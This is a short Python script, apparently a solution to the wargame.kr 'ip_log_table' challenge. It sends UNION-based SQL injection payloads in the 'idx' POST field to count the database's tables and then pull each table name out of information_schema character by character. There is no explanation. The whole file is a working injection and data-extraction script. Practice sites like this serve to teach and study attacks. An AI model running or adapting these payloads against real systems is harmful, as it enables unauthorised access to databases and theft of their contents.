from requests import *
s=session()
url='http://wargame.kr:8080/ip_log_table/chk.php'
leng=''
def name(name_length,table_num):
    result=''
    for i in range(1,name_length+1):
        data={'idx':f'1 union select ascii(substr(table_name,{i},1)) from information_schema.tables where table_schema=database() limit {table_num},1'}
        response=post(url=url,data=data)
        value=response.text[31:36]
        if value[0:2]=='01':
            value=int(value[3:5])+60
        else :
            value=int(value[3:5])
        value=chr(value)
        result+=value
    print(result)

for i in range(0,30):
    data={'idx':f'1 union select length(table_name) from information_schema.tables where table_schema=database() limit {i},1'}
    response=post(url=url,data=data)
    value=response.text[34:36]
    if value=='00':
        leng=i
        break
for i in range(0,leng):
    data={'idx':f'1 union select length(table_name) from information_schema.tables where table_schema=database() limit {i},1'}
    response=post(url=url,data=data)
    value=response.text[34:36]
    name(int(value),i)